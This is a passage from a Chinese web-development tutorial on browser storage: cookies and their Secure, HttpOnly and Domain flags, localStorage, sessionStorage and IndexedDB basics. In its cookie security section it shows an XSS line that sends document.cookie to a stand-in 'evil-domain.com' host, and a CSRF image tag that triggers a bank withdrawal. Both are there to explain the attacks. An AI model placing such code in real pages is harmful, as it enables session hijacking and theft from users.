<h5 id="持久性-Cookie"><a href="#持久性-Cookie" class="headerlink" title="持久性 Cookie"></a>持久性 Cookie</h5><p>和关闭浏览器便失效的会话期 Cookie 不同，持久性 Cookie 可以指定一个特定的过期时间（Expires）或有效期（Max-Age）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</span><br></pre></td></tr></table></figure>

<p><strong>Tips:</strong> 当 Cookie 的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。</p>
<h4 id="Cookie-的-Secure-和-HttpOnly-标记"><a href="#Cookie-的-Secure-和-HttpOnly-标记" class="headerlink" title="Cookie 的 Secure 和 HttpOnly 标记"></a>Cookie 的 Secure 和 HttpOnly 标记</h4><p>HttpOnly 不支持读写，浏览器不允许脚本操作 document.cookie 去更改 cookie， 所以为避免跨域脚本 (XSS) 攻击，通过 JavaScript 的 Document.cookie API 无法访问带有 HttpOnly 标记的 Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 HttpOnly 标记。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</span><br></pre></td></tr></table></figure>

<p>标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。从 Chrome 52 和 Firefox 52 开始，不安全的站点（http:）无法使用 Cookie 的 Secure 标记。</p>
<ul>
<li>生成方式二：js 中可以通过 document.cookie 可以读写 cookie，以键值对的形式展示</li>
</ul>
<p>例如我们在百度首页控制台输入以下三句代码，便可以在 Chrome 的 Application 面板查看生成的 cookie:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.cookie=&quot;name=hello&quot;;</span><br><span class="line">document.cookie=&quot;age=18&quot;;</span><br><span class="line">document.cookie=&quot;domain=google.com;gender=male&quot;</span><br></pre></td></tr></table></figure>

<p><img src="%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/code.png" alt="code"><br>查看结果<br><img src="%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/cookie.png" alt="cookie"></p>
<p>从上图中我们可以得出：</p>
<h5 id="Cookie-的作用域"><a href="#Cookie-的作用域" class="headerlink" title="Cookie 的作用域"></a>Cookie 的作用域</h5><p>Domain 和 Path 标识定义了 Cookie 的作用域：即 Cookie 应该发送给哪些 URL。<br>Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。</p>
<p><strong>Domain 标识指定了哪些域名可以接受 Cookie。如果没有设置 domain，就会自动绑定到执行语句的当前域</strong>。 如果设置为”.google.com”,则所有以”google.com”结尾的域名都可以访问该 Cookie，所以在百度首页上读取不到第三条代码存储 Cookie 值。</p>
<p>当将域名设置为当前执行语句的域名时，就可以看见该条记录<br><img src="%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/code.png" alt="code1"><br>查看结果<br><img src="%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/cookie.png" alt="cookie1"></p>
<h3 id="4-Cookie-的缺陷"><a href="#4-Cookie-的缺陷" class="headerlink" title="4.Cookie 的缺陷"></a>4.Cookie 的缺陷</h3><ul>
<li><p>Cookie 不够大<br>Cookie 的大小限制在 4KB 左右，对于复杂的存储需求来说是不够用的。当 Cookie 超过 4KB 时，它将面临被裁切的命运。这样看来，Cookie 只能用来存取少量的信息。此外很多浏览器对一个站点的 cookie 个数也是有限制的。<br>这里需注意：各浏览器的 cookie <strong>每一个 name=value 的 value 值大概在 4k</strong>，所以 4k 并不是一个域名下所有的 cookie 共享的,而是一个 name 的大小。</p>
</li>
<li><p>过多的 Cookie 会带来巨大的性能浪费<br>Cookie 是紧跟域名的。<strong>同一个域名下的所有请求，都会携带 Cookie</strong>。大家试想，如果我们此刻仅仅是请求一张图片或者一个 CSS 文件，我们也要携带一个 Cookie 跑来跑去（关键是 Cookie 里存储的信息并不需要），这是一件多么劳民伤财的事情。Cookie 虽然小，请求却可以有很多，随着请求的叠加，这样的不必要的 Cookie 带来的开销将是无法想象的。<br>cookie 是用来维护用户信息的，而域名(domain)下所有请求都会携带 cookie，但对于静态文件的请求，携带 cookie 信息根本没有用，此时可以通过 cdn（存储静态文件的）的域名和主站的域名分开来解决。</p>
</li>
<li><p>安全问题<br>由于在 HTTP 请求中的 Cookie 是明文传递的，所以安全性成问题，除非用 HTTPS。</p>
</li>
</ul>
<h3 id="5-Cookie-与安全"><a href="#5-Cookie-与安全" class="headerlink" title="5.Cookie 与安全"></a>5.Cookie 与安全</h3><p><strong>tips:</strong> 当机器处于不安全环境时，切记不能通过 HTTP Cookie 存储、传输敏感信息</p>
<ul>
<li>会话劫持和跨站脚本攻击（XSS）<br>在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 XSS 攻击。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</span><br></pre></td></tr></table></figure>

<ul>
<li>跨站请求伪造（CSRF）<br>比如在不安全聊天室或论坛上的一张图片，当你访问这张图片，它实际上是一个给你银行服务器发送提现的请求：<br>当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>有一些方法可以阻止此类事件的发生：</p>
<ul>
<li>对用户输入进行过滤来阻止 XSS；</li>
<li>任何敏感操作都需要确认；</li>
<li>用于敏感信息的 Cookie 只能拥有较短的生命周期；</li>
</ul>
<p>为了弥补 Cookie 的局限性，让“专业的人做专业的事情”，Web Storage 出现了。<br><strong>HTML5 中新增了本地存储的解决方案—-Web Storage，它分成两类：sessionStorage 和 localStorage。</strong>这样有了 WebStorage 后，cookie 能只做它应该做的事情了——作为客户端与服务器交互的通道，保持客户端状态。</p>
<h1 id="LocalStorage"><a href="#LocalStorage" class="headerlink" title="LocalStorage"></a>LocalStorage</h1><h2 id="1-LocalStorage-的特点"><a href="#1-LocalStorage-的特点" class="headerlink" title="1.LocalStorage 的特点"></a>1.LocalStorage 的特点</h2><ul>
<li>保存的数据长期存在，下一次访问该网站的时候，网页可以直接读取以前保存的数据。</li>
<li>大小为 5M 左右</li>
<li>仅在客户端使用，不和服务端进行通信</li>
<li>接口封装较好</li>
</ul>
<h2 id="2-存入-读取-删除数据"><a href="#2-存入-读取-删除数据" class="headerlink" title="2.存入/读取/删除数据"></a>2.存入/读取/删除数据</h2><p>localStorage 保存的数据，以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。 存入数据使用 setItem 方法。它接受两个参数，第一个是键名，第二个是保存的数据。 localStorage.setItem(“key”,”value”);读取数据使用 getItem 方法。它只有一个参数，就是键名。 var valueLocal=localStorage.getItem(“key”);</p>
<ul>
<li>存入数据<br><strong>localStorage.setItem(“key”, “value”)</strong><br>该方法接受一个键名和值作为参数，将会把键值对添加到存储中，如果键名存在，则更新其对应的值。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">if (window.localStorage) &#123;</span><br><span class="line">  localStorage.setItem(&quot;name&quot;, &quot;hello&quot;);</span><br><span class="line">  localStorage.setItem(&quot;age&quot;, 18);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>读取数据<br><strong>localStorage.getItem(“key”)</strong><br>该方法接受一个键名作为参数，返回键名对应的值<br>只需要传入 key 即可</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var name = localStorage.getItem(&quot;name&quot;);</span><br><span class="line">var age = localStorage.getItem(&quot;age&quot;);</span><br><span class="line">console.log(name) // hello</span><br><span class="line">console.log(age) // 18</span><br></pre></td></tr></table></figure>

<ul>
<li>删除数据<br><strong>localStorage.removeItem(“key”);</strong><br>该方法接受一个键名作为参数，并把该键名从存储中删除。<br>只需要传入 key 即可</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">localStorage.removeItem(&quot;name&quot;);</span><br><span class="line">localStorage.removeItem(&quot;age&quot;);</span><br></pre></td></tr></table></figure>

<ul>
<li>移除所有<br><strong>localStorage.clear();</strong><br>调用该方法会清空存储中的所有键名。<br>不需要传入参数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localStorage.clear();</span><br></pre></td></tr></table></figure>

<h2 id="3-使用场景"><a href="#3-使用场景" class="headerlink" title="3.使用场景"></a>3.使用场景</h2><p>LocalStorage 在存储方面没有什么特别的限制，理论上 Cookie 无法胜任的、可以用简单的键值对来存取的数据存储任务，都可以交给 LocalStorage 来做。</p>
<p>这里给大家举个例子，考虑到 LocalStorage 的特点之一是持久，有时我们更倾向于用它来存储一些内容稳定的资源。比如图片内容丰富的电商网站会用它来存储 Base64 格式的图片字符串：</p>
<h1 id="SessionStorage"><a href="#SessionStorage" class="headerlink" title="SessionStorage"></a>SessionStorage</h1><p>sessionStorage 保存的数据用于浏览器的一次会话，当会话结束（通常是该窗口关闭），数据被清空；sessionStorage 特别的一点在于，即便是相同域名下的两个页面，只要它们不在同一个浏览器窗口中打开，那么它们的 sessionStorage 内容便无法共享；localStorage 在所有同源窗口中都是共享的；cookie 也是在所有同源窗口中都是共享的。除了保存期限的长短不同，SessionStorage 的属性和方法与 LocalStorage 完全一样。</p>
<h2 id="1-sessionStorage-的特点"><a href="#1-sessionStorage-的特点" class="headerlink" title="1.sessionStorage 的特点"></a>1.sessionStorage 的特点</h2><ul>
<li>会话级别的浏览器存储</li>
<li>大小为 5M 左右</li>
<li>仅在客户端使用，不和服务端进行通信</li>
<li>接口封装较好</li>
</ul>
<h2 id="2-存入-读取-删除数据-1"><a href="#2-存入-读取-删除数据-1" class="headerlink" title="2.存入/读取/删除数据"></a>2.存入/读取/删除数据</h2><p>sessionStorage 保存的数据，以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。 存入数据使用 setItem 方法。它接受两个参数，第一个是键名，第二个是保存的数据。 sessionStorage.setItem(“key”,”value”);读取数据使用 getItem 方法。它只有一个参数，就是键名。 var valueLocal=sessionStorage.getItem(“key”);</p>
<ul>
<li>存入数据<br><strong>sessionStorage.setItem(“key”, “value”)</strong><br>该方法接受一个键名和值作为参数，将会把键值对添加到存储中，如果键名存在，则更新其对应的值。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">if (window.sessionStorage) &#123;</span><br><span class="line">  sessionStorage.setItem(&quot;name&quot;, &quot;hello&quot;);</span><br><span class="line">  sessionStorage.setItem(&quot;age&quot;, 18);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>读取数据<br><strong>sessionStorage.getItem(“key”)</strong><br>该方法接受一个键名作为参数，返回键名对应的值<br>只需要传入 key 即可</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var name = sessionStorage.getItem(&quot;name&quot;);</span><br><span class="line">var age = sessionStorage.getItem(&quot;age&quot;);</span><br><span class="line">console.log(name) // hello</span><br><span class="line">console.log(age) // 18</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>删除数据<br><strong>sessionStorage.removeItem(“key”);</strong><br>该方法接受一个键名作为参数，并把该键名从存储中删除。<br>只需要传入 key 即可</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessionStorage.removeItem(&quot;name&quot;);</span><br><span class="line">sessionStorage.removeItem(&quot;age&quot;);</span><br></pre></td></tr></table></figure>

<ul>
<li>移除所有<br><strong>sessionStorage.clear();</strong><br>调用该方法会清空存储中的所有键名。<br>不需要传入参数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessionStorage.clear();</span><br></pre></td></tr></table></figure>

<h2 id="3-使用场景-1"><a href="#3-使用场景-1" class="headerlink" title="3.使用场景"></a>3.使用场景</h2><p>sessionStorage 更适合用来存储生命周期和它同步的会话级别的信息。这些信息只适用于当前会话，当你开启新的会话时，它也需要相应的更新或释放。比如微博的 sessionStorage 就主要是存储你本次会话的浏览足迹</p>
<h2 id="sessionStorage-、localStorage-和-cookie-之间的区别"><a href="#sessionStorage-、localStorage-和-cookie-之间的区别" class="headerlink" title="sessionStorage 、localStorage 和 cookie 之间的区别"></a><strong>sessionStorage 、localStorage 和 cookie 之间的区别</strong></h2><ul>
<li>共同点：都是保存在浏览器端，且都遵循同源策略。</li>
<li>不同点：在于生命周期与作用域的不同</li>
</ul>
<p>作用域：localStorage 只要在相同的协议、相同的主机名、相同的端口下，就能读取/修改到同一份 localStorage 数据。sessionStorage 比 localStorage 更严苛一点，除了协议、主机名、端口外，还要求在同一窗口（也就是浏览器的标签页）下</p>
<p>生命周期：localStorage 是持久化的本地存储，存储在其中的数据是永远不会过期的，使其消失的唯一办法是手动删除；而 sessionStorage 是临时性的本地存储，它是会话级别的存储，当会话结束（页面被关闭）时，存储内容也随之被释放。</p>
<p>Web Storage 是一个从定义到使用都非常简单的东西。它使用键值对的形式进行存储，这种模式有点类似于对象，却甚至连对象都不是——它只能存储字符串，要想得到对象，我们还需要先对字符串进行一轮解析。</p>
<p>说到底，Web Storage 是对 Cookie 的拓展，它只能用于存储少量的简单数据。当遇到大规模的、结构复杂的数据时，Web Storage 也爱莫能助了。这时候我们就要清楚我们的终极大 boss——IndexedDB！</p>
<h1 id="IndexDB"><a href="#IndexDB" class="headerlink" title="IndexDB"></a>IndexDB</h1><p>通俗地说，IndexedDB 就是<strong>浏览器提供的本地数据库</strong>，它可以被网页脚本创建和操作。IndexedDB 允许储存大量数据，提供查找接口，还能建立索引。这些都是 LocalStorage 所不具备的。就数据库类型而言，IndexedDB 不属于关系型数据库（不支持 SQL 查询语句），更接近 NoSQL 数据库。<br>IndexedDB 是一种低级 API，**用于客户端存储大量结构化数据(包括文件和 blobs)**。该 API 使用索引来实现对该数据的高性能搜索。IndexedDB 是一个运行在浏览器上的非关系型数据库。既然是数据库了，那就不是 5M、10M 这样小打小闹级别了。理论上来说，IndexedDB 是没有存储上限的（一般来说不会小于 250M）。它不仅可以存储字符串，还可以存储二进制数据。</p>
<h2 id="1-IndexedDB-的特点"><a href="#1-IndexedDB-的特点" class="headerlink" title="1.IndexedDB 的特点"></a>1.IndexedDB 的特点</h2><ul>
<li><p>键值对储存。<br>IndexedDB 内部采用对象仓库（object store）存放数据。所有类型的数据都可以直接存入，包括 JavaScript 对象。对象仓库中，数据以”键值对”的形式保存，每一个数据记录都有对应的主键，主键是独一无二的，不能有重复，否则会抛出一个错误。</p>
</li>
<li><p>异步<br>IndexedDB 操作时不会锁死浏览器，用户依然可以进行其他操作，这与 LocalStorage 形成对比，后者的操作是同步的。异步设计是为了防止大量数据的读写，拖慢网页的表现。</p>
</li>
<li><p>支持事务。<br>IndexedDB 支持事务（transaction），这意味着一系列操作步骤之中，只要有一步失败，整个事务就都取消，数据库回滚到事务发生之前的状态，不存在只改写一部分数据的情况。</p>
</li>
<li><p>同源限制<br>IndexedDB 受到同源限制，每一个数据库对应创建它的域名。网页只能访问自身域名下的数据库，而不能访问跨域的数据库。</p>
</li>
<li><p>储存空间大<br>IndexedDB 的储存空间比 LocalStorage 大得多，一般来说不少于 250MB，甚至没有上限。</p>
</li>
<li><p>支持二进制储存。<br>IndexedDB 不仅可以储存字符串，还可以储存二进制数据（ArrayBuffer 对象和 Blob 对象）。</p>
</li>
</ul>
<h2 id="2-基本概念"><a href="#2-基本概念" class="headerlink" title="2.基本概念"></a>2.基本概念</h2><p>IndexedDB 是一个比较复杂的 API，涉及不少概念。它把不同的实体，抽象成一个个对象接口。学习这个 API，就是学习它的各种对象接口。</p>
<ul>
<li><p>数据库：IDBDatabase 对象<br>数据库是一系列相关数据的容器。每个域名（严格的说，是协议 + 域名 + 端口）都可以新建任意多个数据库。<br>IndexedDB 数据库有版本的概念。同一个时刻，只能有一个版本的数据库存在。如果要修改数据库结构（新增或删除表、索引或者主键），只能通过升级数据库版本完成。</p>
</li>
<li><p>对象仓库：IDBObjectStore 对象<br>每个数据库包含若干个对象仓库（object store）。它类似于关系型数据库的表格。</p>
</li>
<li><p>数据记录<br>对象仓库保存的是数据记录。每条记录类似于关系型数据库的行，但是只有主键和数据体两部分。主键用来建立默认的索引，必须是不同的，否则会报错。主键可以是数据记录里面的一个属性，也可以指定为一个递增的整数编号。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; id: 1, text: &#x27;foo&#x27; &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>索引： IDBIndex 对象<br>为了加速数据的检索，可以在对象仓库里面，为不同的属性建立索引。</p>
</li>
<li><p>事务： IDBTransaction 对象<br>数据记录的读写和删改，都要通过事务完成。事务对象提供 error、abort 和 complete 三个事件，用来监听操作结果。</p>
</li>
<li><p>操作请求：IDBRequest 对象</p>
</li>
<li><p>指针： IDBCursor 对象</p>
</li>
<li><p>主键集合：IDBKeyRange 对象</p>
</li>
</ul>
<h2 id="3-IndexedDB-的常见操作"><a href="#3-IndexedDB-的常见操作" class="headerlink" title="3.IndexedDB 的常见操作"></a>3.IndexedDB 的常见操作</h2><p>在 IndexedDB 大部分操作并不是我们常用的调用方法，返回结果的模式，而是请求——响应的模式。<br>建立打开 IndexedDB —- <strong>window.indexedDB.open(“testDB”)</strong></p>
<p>操作流程：</p>
<h4 id="3-1-打开数据库"><a href="#3-1-打开数据库" class="headerlink" title="3.1.打开数据库"></a>3.1.打开数据库</h4><p>使用 IndexedDB 的第一步是打开数据库，使用 indexedDB.open()方法。</p>
<p><strong>window.indexedDB.open(databaseName, version)</strong><br>这个方法接受两个参数，第一个参数是字符串，表示数据库的名字。如果指定的数据库不存在，就会新建数据库。第二个参数是整数，表示数据库的版本。如果省略，打开已有数据库时，默认为当前版本；新建数据库时，默认为 1。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var request = window.indexedDB.open(&quot;testDB&quot;, version);</span><br></pre></td></tr></table></figure>

<p>indexedDB.open()方法返回一个 IDBOpenDBRequest 对象。这个对象通过三种事件 error、success、upgradeneeded，处理打开数据库的操作结果。</p>
<p><img src="%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/indexDB.png" alt="indexDB"></p>
<p>这条指令并不会返回一个 DB 对象的句柄，我们得到的是一个 <strong>IDBOpenDBRequest 对象</strong>，而我们希望得到的 DB 对象在其 result 属性中</p>
<p>除了 result，IDBOpenDBRequest 接口定义了几个重要属性:</p>
<p>onerror: 请求失败的回调函数句柄</p>
<p>onsuccess:请求成功的回调函数句柄</p>
<p>onupgradeneeded:请求数据库版本变化句柄</p>
<ul>
<li>error 事件表示打开数据库失败。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">request.onerror = function (event) &#123;</span><br><span class="line">  console.log(&#x27;数据库打开报错&#x27;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>success 事件表示成功打开数据库。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var db;</span><br><span class="line">request.onsuccess = function (event) &#123;</span><br><span class="line">  db = request.result;</span><br><span class="line">  console.log(&#x27;数据库打开成功&#x27;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这时，通过 request 对象的 result 属性拿到数据库对象。</p>
<ul>
<li>upgradeneeded 事件</li>
</ul>
<p>如果指定的版本号，大于数据库的实际版本号，就会发生数据库升级事件 upgradeneeded。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var db;</span><br><span class="line">request.onupgradeneeded = function (event) &#123;</span><br><span class="line">  db = event.target.result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时通过事件对象的 target.result 属性，拿到数据库实例。</p>
<h4 id="3-2-新建数据库"><a href="#3-2-新建数据库" class="headerlink" title="3.2.新建数据库"></a>3.2.新建数据库</h4><p><strong>createObjectStore</strong><br>新建数据库与打开数据库是同一个操作。如果指定的数据库不存在，就会新建。不同之处在于，后续的操作主要在 upgradeneeded 事件的监听函数里面完成，因为这时版本从无到有，所以会触发这个事件。</p>
<p>通常，新建数据库以后，第一件事是新建对象仓库（即新建表）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">request.onupgradeneeded = function(event) &#123;</span><br><span class="line">  db = event.target.result;</span><br><span class="line">  var objectStore = db.createObjectStore(&#x27;person&#x27;, &#123; keyPath: &#x27;id&#x27; &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，数据库新建成功以后，新增一张叫做 person 的表格，主键是 id。<br>更好的写法是先判断一下，这张表格是否存在，如果不存在再新建。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.onupgradeneeded = function (event) &#123;</span><br><span class="line">  db = event.target.result;</span><br><span class="line">  var objectStore;</span><br><span class="line">  if (!db.objectStoreNames.contains(&#x27;person&#x27;)) &#123;</span><br><span class="line">    objectStore = db.createObjectStore(&#x27;person&#x27;, &#123; keyPath: &#x27;id&#x27; &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主键（key）是默认建立索引的属性。比如，数据记录是{ id: 1, name: ‘张三’ }，那么 id 属性可以作为主键。主键也可以指定为下一层对象的属性，比如{ foo: { bar: ‘baz’ } }的 foo.bar 也可以指定为主键。</p>
<p>如果数据记录里面没有合适作为主键的属性，那么可以让 IndexedDB 自动生成主键。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var objectStore = db.createObjectStore(</span><br><span class="line">  &#x27;person&#x27;,</span><br><span class="line">  &#123; autoIncrement: true &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>上面代码中，指定主键为一个递增的整数。</p>
<p>新建对象仓库以后，下一步可以新建索引。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">request.onupgradeneeded = function(event) &#123;</span><br><span class="line">  db = event.target.result;</span><br><span class="line">  var objectStore = db.createObjectStore(&#x27;person&#x27;, &#123; keyPath: &#x27;id&#x27; &#125;);</span><br><span class="line">  objectStore.createIndex(&#x27;name&#x27;, &#x27;name&#x27;, &#123; unique: false &#125;);</span><br><span class="line">  objectStore.createIndex(&#x27;email&#x27;, &#x27;email&#x27;, &#123; unique: true &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，**IDBObject.createIndex()**的三个参数分别为索引名称、索引所在的属性、配置对象（说明该属性是否包含重复的值）。</p>
<h4 id="3-3-新增数据"><a href="#3-3-新增数据" class="headerlink" title="3.3.新增数据"></a>3.3.新增数据</h4><p>新增数据指的是向对象仓库写入数据记录。这需要通过事务完成。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function add() &#123;</span><br><span class="line">  var request = db.transaction([&#x27;person&#x27;], &#x27;readwrite&#x27;)</span><br><span class="line">    .objectStore(&#x27;person&#x27;)</span><br><span class="line">    .add(&#123; id: 1, name: &#x27;张三&#x27;, age: 24, email: &#x27;zhangsan@example.com&#x27; &#125;);</span><br><span class="line"></span><br><span class="line">  request.onsuccess = function (event) &#123;</span><br><span class="line">    console.log(&#x27;数据写入成功&#x27;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  request.onerror = function (event) &#123;</span><br><span class="line">    console.log(&#x27;数据写入失败&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add();</span><br></pre></td></tr></table></figure>

<p>上面代码中，写入数据需要新建一个事务。新建时必须指定表格名称和操作模式（”只读”或”读写”）。新建事务以后，通过 **IDBTransaction.objectStore(name)**方法，拿到 IDBObjectStore 对象，再通过表格对象的 add()方法，向表格写入一条记录。</p>
<p>写入操作是一个异步操作，通过监听连接对象的 success 事件和 error 事件，了解是否写入成功。</p>
<h4 id="3-4-读取数据"><a href="#3-4-读取数据" class="headerlink" title="3.4.读取数据"></a>3.4.读取数据</h4><p>读取数据也是通过事务完成。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function read() &#123;</span><br><span class="line">   var transaction = db.transaction([&#x27;person&#x27;]);</span><br><span class="line">   var objectStore = transaction.objectStore(&#x27;person&#x27;);</span><br><span class="line">   var request = objectStore.get(1);</span><br><span class="line"></span><br><span class="line">   request.onerror = function(event) &#123;</span><br><span class="line">     console.log(&#x27;事务失败&#x27;);</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   request.onsuccess = function( event) &#123;</span><br><span class="line">      if (request.result) &#123;</span><br><span class="line">        console.log(&#x27;Name: &#x27; + request.result.name);</span><br><span class="line">        console.log(&#x27;Age: &#x27; + request.result.age);</span><br><span class="line">        console.log(&#x27;Email: &#x27; + request.result.email);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        console.log(&#x27;未获得数据记录&#x27;);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">read();</span><br></pre></td></tr></table></figure>

<p>上面代码中，**objectStore.get()**方法用于读取数据，参数是主键的值。</p>
<h4 id="3-5-遍历数据"><a href="#3-5-遍历数据" class="headerlink" title="3.5.遍历数据"></a>3.5.遍历数据</h4><p>遍历数据表格的所有记录，要使用指针对象 IDBCursor。</p>
